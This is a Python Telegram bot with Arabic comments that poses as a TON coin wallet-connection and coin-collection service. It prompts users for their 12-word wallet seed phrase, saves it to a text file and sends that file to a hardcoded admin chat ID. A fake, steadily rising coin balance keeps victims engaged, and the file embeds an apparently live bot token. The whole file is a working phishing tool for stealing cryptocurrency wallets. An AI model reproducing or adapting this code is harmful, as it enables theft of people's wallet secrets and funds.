import telebot
from telebot import types
import time
import threading

# التوكن الخاص بالبوت
TOKEN = '7344180628:AAGznJNReVptyaqL9Vy4NOfeLLE4IyqqmDk'
bot = telebot.TeleBot(TOKEN)

# معرف الإدمن الذي سيستلم الملف
ADMIN_ID = '209191317'

# البيانات المدخلة من قبل المستخدمين
user_data = {}
user_coins = {}
user_messages = {}  # لتخزين معرف الرسائل

# دالة بدء البوت وعرض الصورة والأزرار
@bot.message_handler(commands=['start'])
def send_welcome(message):
    # إرسال الصورة
    photo_url = 'https://f.top4top.io/p_3179lrajg0.jpg'
    bot.send_photo(message.chat.id, photo_url, caption="<b>Welcome! Click the button below to connect your wallet or start collecting TON coins.</b>", parse_mode='HTML')
    
    # إعداد الأزرار
    markup = types.InlineKeyboardMarkup()
    wallet_btn = types.InlineKeyboardButton(text='Wallet Connection', callback_data='wallet_connection')
    coin_btn = types.InlineKeyboardButton(text='TON Coin Collection', callback_data='ton_coin_collection')
    keys_btn = types.InlineKeyboardButton(text='How to get wallet keys', callback_data='how_to_get_wallet_keys')  # الزر الجديد
    markup.add(wallet_btn, coin_btn, keys_btn)  # إضافة الزر الجديد إلى الأزرار
    bot.send_message(message.chat.id, "<b>Click a button below to continue.</b>", reply_markup=markup, parse_mode='HTML')

# عند الضغط على زر "Wallet Connection"
@bot.callback_query_handler(func=lambda call: call.data == 'wallet_connection')
def wallet_connection(call):
    bot.send_message(call.message.chat.id, "<b>Please enter your 12 wallet key phrases, separated by spaces:</b>", parse_mode='HTML')
    bot.register_next_step_handler(call.message, collect_wallet_data)

# جمع البيانات المدخلة (الكلمات المفتاحية)
def collect_wallet_data(message):
    words = message.text.split()
    
    # التحقق من أن المستخدم أدخل 12 كلمة
    if len(words) == 12:
        user_data[message.chat.id] = words
        confirm_and_send(message)
    else:
        bot.send_message(message.chat.id, "<b>Error: Please enter exactly 12 key phrases.</b>", parse_mode='HTML')
        bot.register_next_step_handler(message, collect_wallet_data)

# تأكيد الإرسال عبر زر "Send"
def confirm_and_send(message):
    markup = types.InlineKeyboardMarkup()
    send_btn = types.InlineKeyboardButton(text='Send', callback_data='send_data')
    markup.add(send_btn)
    bot.send_message(message.chat.id, "<b>Click 'Send' to submit your wallet key phrases.</b>", reply_markup=markup, parse_mode='HTML')

# إرسال البيانات إلى الإدمن كملف TXT
@bot.callback_query_handler(func=lambda call: call.data == 'send_data')
def send_to_admin(call):
    wallet_phrases = ' '.join(user_data[call.message.chat.id])
    file_name = f"wallet_{call.message.chat.id}.txt"

    # إنشاء ملف نصي يحتوي على الكلمات المفتاحية
    with open(file_name, 'w') as f:
        f.write(wallet_phrases)
    
    # إرسال الملف النصي إلى الإدمن
    with open(file_name, 'rb') as f:
        bot.send_document(ADMIN_ID, f)

    bot.send_message(call.message.chat.id, "<b>Your wallet key phrases have been sent successfully.</b>", parse_mode='HTML')

# عند الضغط على زر "TON Coin Collection"
@bot.callback_query_handler(func=lambda call: call.data == 'ton_coin_collection')
def start_coin_collection(call):
    if call.message.chat.id not in user_coins:
        user_coins[call.message.chat.id] = 0.000001
        # بدء عداد الزيادة التلقائية
        threading.Thread(target=coin_collector, args=(call.message.chat.id,)).start()
    update_coin_balance(call.message.chat.id, call.message.message_id)

# دالة لزيادة الرصيد تلقائيًا
def coin_collector(user_id):
    while user_id in user_coins:
        time.sleep(1)
        user_coins[user_id] += 0.000001

# تحديث رصيد المستخدم وعرضه
def update_coin_balance(user_id, previous_message_id):
    markup = types.InlineKeyboardMarkup()
    refresh_btn = types.InlineKeyboardButton(text='Refresh', callback_data='refresh_coins')
    markup.add(refresh_btn)
    
    # حذف الرسالة السابقة إذا كانت موجودة
    if user_id in user_messages:
        bot.delete_message(user_id, user_messages[user_id])
    
    # إرسال رسالة جديدة تحتوي على الرصيد الحالي وزر "Refresh"
    balance = user_coins.get(user_id, 0.000001)
    message = bot.send_message(user_id, f"<b>Your current TON coin balance is: {balance:.6f}</b>", reply_markup=markup, parse_mode='HTML')
    
    # تخزين معرف الرسالة الجديدة
    user_messages[user_id] = message.message_id

# عند الضغط على زر "Refresh"
@bot.callback_query_handler(func=lambda call: call.data == 'refresh_coins')
def refresh_coins(call):
    update_coin_balance(call.message.chat.id, call.message.message_id)

# عند الضغط على زر "How to get wallet keys"
@bot.callback_query_handler(func=lambda call: call.data == 'how_to_get_wallet_keys')
def how_to_get_wallet_keys(call):
    bot.send_message(call.message.chat.id, "<b>Click the link below to view the guide on how to get wallet keys:</b>\nhttps://g.top4top.io/p_3179ewncp0.gif", parse_mode='HTML')

# بدء البوت
bot.polling()